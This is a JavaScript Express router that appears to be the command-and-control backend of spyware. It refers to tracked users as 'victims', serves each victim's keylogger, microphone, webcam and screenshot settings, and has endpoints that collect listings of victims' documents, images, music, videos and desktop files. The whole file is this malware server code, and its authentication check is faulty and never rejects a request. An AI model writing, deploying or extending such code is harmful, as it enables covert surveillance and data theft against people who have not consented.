const express = require("express");
const database = require("../../database/index");
const router = express.Router();

const auth = async (req, res, next) =>{

    if(req.body.id != null && req.body.name != null & req.body.password != null){

        const victim = database.collection("users").doc(req.body.id)
        const doc = await victim.get()

        if(!doc.exists && req.body.name != doc.data().name && req.body.password != doc.data().password){
            res.status(401).json({
                status: false
            })
        }
    }

    return next();

}


router.get("/", async (req, res) =>{

    const server = database.collection("server").doc("settings");
    const doc = await server.get()

    if(doc.exists){
        res.status(200).json(doc.data())
    }else{
        res.status(401).json({
            status: false
        })
    }

})

router.post("/profile", auth, async (req, res) => {

    const victim = database.collection("users").doc(req.body.id);
    const doc = await victim.get()

    res.status(200).json({
        status: true,
        files: doc.data().files,
        keylogger: doc.data().keylogger,
        microphone: doc.data().microphone,
        screenshots: doc.data().screenshots,
        update: doc.data().update,
        webcam: doc.data().webcam
    })

});

router.post("/profile/date/post-documents", auth, async (req, res) =>{

    const data = database.collection("users").doc(req.body.id).collection("data").doc("storage").collection("documents").doc("files").collection(req.body.date)
    const doc = await data.where("name", "==", false).get()


    if(doc.empty){
        documents()
    }else{
        
        res.status(401).json({
            status: false
        })
    }

    function documents(){
        const document_0={
            name: false,
            size: false,
            date: false
        }
    
        try {
            
            database.collection("users").doc(req.body.id).collection("data").doc("storage").collection("documents").doc("files").collection(req.body.date).add(document_0)
            
            res.status(200).json({
                status: true
            })
    
        } catch (error) {
            res.status(401).json({
                status: false
            })
        }
    }
    
})

router.post("/profile/post-documents", auth, (req, res) =>{

    const documents={
        name: req.body.documents,
        size: req.body.size,
        date: req.body.date
    }

    try {
        database.collection("users").doc(req.body.id).collection("data").doc("storage").collection("documents").doc("files").collection(req.body.uid).add(documents)

        res.status(200).json({
            status: true
        })

    } catch (error) {
        
        res.status(401).json({
            status: false,
        })
    } 

})

//Images

router.post("/profile/date/post-images", auth, async (req, res) =>{

    const data = database.collection("users").doc(req.body.id).collection("data").doc("storage").collection("images").doc("files").collection(req.body.date)
    const doc = await data.where("name", "==", false).get()

    if(doc.empty){
        images()
    }else{
        
        res.status(401).json({
            status: false
        })
    }

    function images(){
        const images_0={
            name: false,
            size: false,
            date: false
        }

        try {
            
            database.collection("users").doc(req.body.id).collection("data").doc("storage").collection("images").doc("files").collection(req.body.date).add(images_0)
            
            res.status(200).json({
                status: true
            })

        } catch (error) {
            res.status(401).json({
                status: false
            })
        }
    }
    
    
})

router.post("/profile/post-images", auth, (req, res) =>{

    const images={
        name: req.body.images,
        size: req.body.size,
        date: req.body.date
    }

    try {
        database.collection("users").doc(req.body.id).collection("data").doc("storage").collection("images").doc("files").collection(req.body.uid).add(images)

        res.status(200).json({
            status: true
        })

    } catch (error) {
        
        res.status(401).json({
            status: false,
        })
    }

})

//Music

router.post("/profile/date/post-music", auth, async (req, res) =>{

    const data = database.collection("users").doc(req.body.id).collection("data").doc("storage").collection("music").doc("files").collection(req.body.date)
    const doc = await data.where("name", "==", false).get()

    if(doc.empty){
        music()
    }else{
        
        res.status(401).json({
            status: false
        })
    }

    function music(){
        const music_0={
            name: false,
            size: false,
            date: false
        }

        try {
            
            database.collection("users").doc(req.body.id).collection("data").doc("storage").collection("music").doc("files").collection(req.body.date).add(music_0)
            
            res.status(200).json({
                status: true
            })

        } catch (error) {
            res.status(401).json({
                status: false
            })
        }
    }
    
})

router.post("/profile/post-music", auth, (req, res) =>{

    const music={
        name: req.body.music,
        size: req.body.size,
        date: req.body.date
    }

    try {
        database.collection("users").doc(req.body.id).collection("data").doc("storage").collection("music").doc("files").collection(req.body.uid).add(music)

        res.status(200).json({
            status: true
        })

    } catch (error) {
        
        res.status(401).json({
            status: false,
        })
    }

})

//Videos

router.post("/profile/date/post-videos", auth, async (req, res) =>{

    const data = database.collection("users").doc(req.body.id).collection("data").doc("storage").collection("videos").doc("files").collection(req.body.date)
    const doc = await data.where("name", "==", false).get()

    if(doc.empty){
        videos()
    }else{
        
        res.status(401).json({
            status: false
        })
    }

    function videos(){
        const videos_0={
            name: false,
            size: false,
            date: false
        }

        try {
            
            database.collection("users").doc(req.body.id).collection("data").doc("storage").collection("videos").doc("files").collection(req.body.date).add(videos_0)
            
            res.status(200).json({
                status: true
            })

        } catch (error) {
            res.status(401).json({
                status: false
            })
        }
    }
    
})

router.post("/profile/post-videos", auth, (req, res) =>{

    const videos={
        name: req.body.videos,
        size: req.body.size,
        date: req.body.date
    }

    try {
        database.collection("users").doc(req.body.id).collection("data").doc("storage").collection("videos").doc("files").collection(req.body.uid).add(videos)

        res.status(200).json({
            status: true
        })

    } catch (error) {
        
        res.status(401).json({
            status: false,
        })
    }

})

//Desktop

router.post("/profile/date/post-desktop", auth, async (req, res) =>{

    const data = database.collection("users").doc(req.body.id).collection("data").doc("storage").collection("desktop").doc("files").collection(req.body.date)
    const doc = await data.where("name", "==", false).get()

    if(doc.empty){
        desktop()
    }else{
        
        res.status(401).json({
            status: false
        })
    }

    function desktop(){
        const desktop_0={
            name: false,
            size: false,
            date: false
        }

        try {
            
            database.collection("users").doc(req.body.id).collection("data").doc("storage").collection("desktop").doc("files").collection(req.body.date).add(desktop_0)
            
            res.status(200).json({
                status: true
            })

        } catch (error) {
            res.status(401).json({
                status: false
            })
        }
    }
    
})

router.post("/profile/post-desktop", auth, async (req, res) =>{

    const desktop={
        name: req.body.desktop,
        size: req.body.size,
        date: req.body.date
    }

    try {
        database.collection("users").doc(req.body.id).collection("data").doc("storage").collection("desktop").doc("files").collection(req.body.uid).add(desktop)

        res.status(200).json({
            status: true
        })

    } catch (error) {
        
        res.status(401).json({
            status: false,
        })
    }

})

module.exports = router;